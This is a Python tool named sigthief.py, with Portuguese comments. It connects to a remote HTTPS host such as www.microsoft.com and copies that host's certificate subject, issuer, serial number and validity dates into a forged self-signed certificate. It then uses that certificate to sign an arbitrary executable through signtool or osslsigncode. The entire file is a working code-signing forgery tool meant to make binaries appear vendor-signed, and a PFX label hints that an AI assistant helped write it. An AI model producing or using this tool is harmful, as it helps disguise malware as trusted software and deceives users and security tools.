# Conteúdo FINAL E CORRIGIDO para o arquivo sigthief.py

from OpenSSL import crypto
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives import serialization
from sys import argv, platform
from pathlib import Path
import shutil
import ssl
import os
import subprocess
import socket
import traceback
import sys

# --- INÍCIO DA CORREÇÃO: URL DO SERVIDOR DE TIMESTAMP ATUALIZADA ---
# O servidor da Symantec/DigiCert antigo é instável. Usaremos o da DigiCert, que é o padrão atual.
TIMESTAMP_URL = "http://timestamp.digicert.com"
# --- FIM DA CORREÇÃO ---

def sign_executable(host, port, signee, signed  ):
    try:
        # --- LÓGICA DE CONEXÃO (sem alteração) ---
        print(f"[+] Conectando a {host}:{port} com suporte a SNI...")
        context = ssl.create_default_context()
        with socket.create_connection((host, int(port))) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                print("[+] Conexão SSL/TLS estabelecida com sucesso.")
                ogcert_der = ssock.getpeercert(binary_form=True)
                if not ogcert_der:
                    raise ConnectionError("Não foi possível obter o certificado do servidor.")
                ogcert = ssl.DER_cert_to_PEM_cert(ogcert_der)
        print(f"[+] Certificado de {host} carregado na memória com sucesso.")
        
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert.encode('utf-8'))

        certDir = Path('certs')
        certDir.mkdir(exist_ok=True)

        PFXFILE = certDir / (host + ".pfx")

        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, x509.get_pubkey().bits())
        cert = crypto.X509()

        print("[+] Clonando detalhes do certificado...")
        cert.set_version(x509.get_version())
        cert.set_serial_number(x509.get_serial_number())
        cert.set_subject(x509.get_subject())
        cert.set_issuer(x509.get_issuer())
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')
        
        print("[+] Criando arquivo PFX para assinatura...")
        
        pfxdata = pkcs12.serialize_key_and_certificates(
            name=b"gemini-signed",
            key=k.to_cryptography_key(),
            cert=cert.to_cryptography(),
            cas=None,
            encryption_algorithm=serialization.NoEncryption()
        )

        PFXFILE.write_bytes(pfxdata)

        if platform == "win32":
            print("[+] Assinando com signtool.exe no Windows...")
            shutil.copy(signee, signed)
            signtool_path = shutil.which("signtool.exe")
            if not signtool_path:
                sdk_path = os.path.join(os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)"), "Windows Kits")
                for root, _, files in os.walk(sdk_path):
                    if "signtool.exe" in files:
                        signtool_path = os.path.join(root, "signtool.exe")
                        break
                else:
                    raise FileNotFoundError("signtool.exe não encontrado. Verifique a instalação do Windows SDK.")
            
            subprocess.check_call([signtool_path, "sign", "/v", "/f", str(PFXFILE), "/p", "", "/tr", TIMESTAMP_URL, "/td", "SHA256", "/fd", "SHA256", signed])
        else:
            print("[+] Assinando com osslsigncode no Linux...")
            args = ("osslsigncode", "sign", "-pkcs12", str(PFXFILE), "-pass", "", "-n", "Benchmark Utility", "-i", TIMESTAMP_URL, "-in", signee, "-out", signed)
            subprocess.check_call(args)

    except Exception as ex:
        print(f"[X] ERRO FATAL no sigthief.py: {ex}")
        traceback.print_exc()
        # Modificado para não sair do processo pai, apenas sinalizar o erro
        raise ex

def main():
    print("--- Ferramenta de Assinatura de Código (sigthief) ---")
    import argparse
    parser = argparse.ArgumentParser(description="Clona um certificado e assina um executável.")
    parser.add_argument("-r", "--remote-host", required=True, help="Host remoto para clonar o certificado (ex: www.microsoft.com)")
    parser.add_argument("-t", "--target-file", required=True, help="Caminho para o executável a ser assinado")
    parser.add_argument("-o", "--output-file", required=True, help="Caminho para o executável de saída assinado")
    args = parser.parse_args()
    
    try:
        sign_executable(args.remote_host, 443, args.target_file, args.output_file)
        print("[+] Assinatura concluída com sucesso!")
    except Exception:
        print("[-] Falha na assinatura.")
        sys.exit(1)

if __name__ == "__main__":
    main()
